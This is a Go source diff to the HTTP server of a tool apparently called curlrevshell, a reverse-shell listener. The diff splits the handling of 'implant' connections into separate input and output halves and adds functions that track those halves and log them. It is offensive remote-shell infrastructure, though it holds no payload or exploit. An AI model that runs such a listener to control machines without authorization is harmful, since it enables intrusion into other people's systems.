@@ -9,11 +9,13 @@ package hsrv
  */
 
 import (
+	"errors"
 	"fmt"
 	"io"
 	"log/slog"
 	"net/http"
 	"os"
+	"strings"
 
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
@@ -27,21 +29,29 @@ const (
 	// MultiConnectionMessage is returned when an implant tries to connect
 	// when one is already connected.
 	MultiConnectionMessage = "Eek!"
-	// UnexpectedOutputMessage is returned when an implant sends an output
-	// line but hasn't connected to /i/{id}.
-	UnexpectedOutputMessage = "Wat?"
+
+	// ShellReadyMessage is what we print when both sides of the shell are
+	// connected.
+	ShellReadyMessage = "Shell is ready to go!"
+
+	// ShellDisconnectedMessage is what we print when both sides of the
+	// shell are gone.
+	ShellDisconnectedMessage = "Shell is gone :("
 )
 
 // Log messages and keys.
 const (
-	LMFileRequested  = "File requested"
-	LMShellInput     = "Sent shell input"
-	LMNewConnection  = "New connection"
-	LMDisconnected   = "Disconnected"
-	LMShellOutput    = "Shell output"
-	LKStaticFilesDir = "static_files_dir"
+	LMDisconnected  = "Disconnected"
+	LMFileRequested = "File requested"
+	LMNewConnection = "New connection"
+	LMShellInput    = "Sent shell input"
+	LMShellOutput   = "Shell output"
+
+	LKDirection      = "direction"
 	LKFilename       = "filename"
 	LKLine           = "line"
+	LKOutput         = "output"
+	LKStaticFilesDir = "static_files_dir"
 )
 
 // newMux returns a new ServeMux, ready to serve.
@@ -95,46 +105,13 @@ func (s *Server) fileHandler(w http.ResponseWriter, r *http.Request) {
 
 // inputHandler accepts a connection from a shell and sends it input.
 func (s *Server) inputHandler(w http.ResponseWriter, r *http.Request) {
-	sl := s.requestLogger(r)
-
-	/* Get the Implant ID. */
-	id := s.getID(r)
-	if "" == id {
-		s.RErrorLogf(r, "No ID in URL")
+	/* Make sure we're ok with this connection and set up logging. */
+	which := "Input"
+	sl := s.startConnection(w, r, &s.curIDIn, &s.curIDOut, which)
+	if nil == sl {
 		return
 	}
-
-	/* Make sure we're the only implant connected. */
-	if !s.curID.CompareAndSwap(nil, &id) {
-		/* Work out what's currently connected. */
-		curID := s.curID.Load()
-		if nil == curID { /* Threading is hard. */
-			s.RErrorLogf(
-				r,
-				"Rejected connection from ID %s, "+
-					"connected too soon after last disconnect",
-				id,
-			)
-		} else {
-			s.RErrorLogf(
-				r,
-				"Rejected connection from ID %s, "+
-					"current ID is %s",
-				id,
-				*curID,
-			)
-		}
-		http.Error(
-			w,
-			MultiConnectionMessage,
-			http.StatusServiceUnavailable,
-		)
-		return
-	}
-	s.RLogf(ConnectedColor, r, "Got a shell: ID:%s", id)
-	defer s.curID.Store(nil)
-	sl.Info(LMNewConnection)
-	defer sl.Info(LMDisconnected)
+	defer s.endConnection(sl, r, &s.curIDIn, &s.curIDOut, which)
 
 	/* Proxy lines from stdin. */
 	rc := http.NewResponseController(w)
@@ -154,7 +131,6 @@ func (s *Server) inputHandler(w http.ResponseWriter, r *http.Request) {
 			}
 			sl.Info(LMShellInput, LKLine, l)
 		case <-r.Context().Done():
-			s.RErrorLogf(r, "Disconnected.")
 			return
 		}
 	}
@@ -163,47 +139,31 @@ func (s *Server) inputHandler(w http.ResponseWriter, r *http.Request) {
 // outputHandler receives a line of output from the shell and prints it, if the
 // id matches the currently-connected shell.
 func (s *Server) outputHandler(w http.ResponseWriter, r *http.Request) {
-	sl := s.requestLogger(r)
-
-	/* Get the Implant ID. */
-	id := s.getID(r)
-	if "" == id {
-		s.RErrorLogf(r, "No ID in URL")
+	/* Make sure we're ok with this connection and set up logging. */
+	which := "Output"
+	sl := s.startConnection(w, r, &s.curIDOut, &s.curIDIn, which)
+	if nil == sl {
 		return
 	}
-	/* Make sure it's the right shell. */
-	if curID := s.curID.Load(); nil == curID || id != *curID {
-		if nil == curID {
-			s.RErrorLogf(
-				r,
-				"No connection but got output from ID %s",
-				id,
-			)
-		} else {
-			s.RErrorLogf(
-				r,
-				"Got output from ID %s while "+
-					"ID %s is connected",
-				id,
-				*curID,
-			)
+	defer s.endConnection(sl, r, &s.curIDOut, &s.curIDIn, which)
+
+	/* Read output and send it to the shell. */
+	b := make([]byte, 2048)
+	for {
+		n, err := r.Body.Read(b)
+		if 0 != n {
+			o := string(b[:n])
+			s.och <- opshell.CLine{Line: o, Plain: true}
+			sl.Info(LMShellOutput, LKOutput, o)
 		}
-		http.Error(
-			w,
-			UnexpectedOutputMessage,
-			http.StatusFailedDependency,
-		)
-		return
-	}
-
-	/* Send the output back. */
-	b, err := io.ReadAll(r.Body)
-	if 0 != len(b) {
-		sl.Info(LMShellOutput, LKLine, string(b))
-		s.Logf(opshell.ColorNone, "%s", string(b))
-	}
-	if nil != err {
-		s.RErrorLogf(r, "Error reading request body: %s", err)
+		if errors.Is(err, io.EOF) ||
+			errors.Is(err, io.ErrUnexpectedEOF) {
+			break
+		}
+		if nil != err {
+			s.RErrorLogf(r, "Error reading output: %s", err)
+			break
+		}
 	}
 }
 
@@ -212,6 +172,108 @@ func (s *Server) outputHandler(w http.ResponseWriter, r *http.Request) {
 func (s *Server) getID(r *http.Request) string {
 	id := r.PathValue(idParam)
 	return id
+}
+
+// startConnection gets the ID from r and stores it in the location pointed to
+// by us if us points to an empty string and other points either to an empty
+// string or a string equal to the ID in r.  r and which will be used for
+// logging.  A suitable logger for r will be returned, or nil if the handler
+// shouldn't process the request.  which should be capitalized.
+func (s *Server) startConnection(
+	w http.ResponseWriter,
+	r *http.Request,
+	us *string,
+	other *string,
+	which string,
+) *slog.Logger {
+	s.curIDL.Lock()
+	defer s.curIDL.Unlock()
+
+	/* This all fails if the ID is empty. */
+	id := s.getID(r)
+	if "" == id {
+		return nil
+	}
+
+	/* eek sends a 503 and a sad message to w. */
+	eek := func() {
+		http.Error(
+			w,
+			MultiConnectionMessage,
+			http.StatusFailedDependency,
+		)
+	}
+
+	/* We'll need this a few times. */
+	lwhich := strings.ToLower(which)
+
+	/* Make sure the other is either empty or the new one. */
+	if "" != *other && id != *other {
+		s.RErrorLogf(
+			r,
+			"Rejected %s connection with ID %s, expcted %s",
+			lwhich,
+			id,
+			*other,
+		)
+		eek()
+		return nil
+	}
+
+	/* Make sure where we want to be is empty. */
+	if id == *us {
+		s.RErrorLogf(
+			r,
+			"Rejected duplicate %s connection with ID %s",
+			lwhich,
+			id,
+		)
+		eek()
+		return nil
+	} else if "" != *us {
+		s.RErrorLogf(
+			r,
+			"Rejected unexpected %s connection with ID %s",
+			lwhich,
+			id,
+		)
+		eek()
+		return nil
+	}
+
+	/* All set, note we're the new us ID. */
+	sl := s.requestLogger(r)
+	s.RLogf(ConnectedColor, r, "%s connected: ID:%s", which, id)
+	sl.Info(LMNewConnection, LKDirection, lwhich)
+	*us = id
+
+	/* If we have both sides, we have a shell. */
+	if *other == id {
+		s.RLogf(ConnectedColor, r, "%s", ShellReadyMessage)
+	}
+
+	return sl
+}
+
+// endConnection stores the empty string in us and logs the connection's end.
+// which should be capitalized.
+func (s *Server) endConnection(
+	sl *slog.Logger,
+	r *http.Request,
+	us *string,
+	other *string,
+	which string,
+) {
+	s.curIDL.Lock()
+	defer s.curIDL.Unlock()
+
+	/* Note we've lost this half of the connection. */
+	*us = ""
+	s.RErrorLogf(r, "%s connection closed", which)
+	if "" == *other {
+		s.RErrorLogf(r, "%s", ShellDisconnectedMessage)
+	}
+	sl.Info(LMDisconnected, LKDirection, strings.ToLower(which))
 }
 
 // requestLogger returns a log.Logger which has information about r.
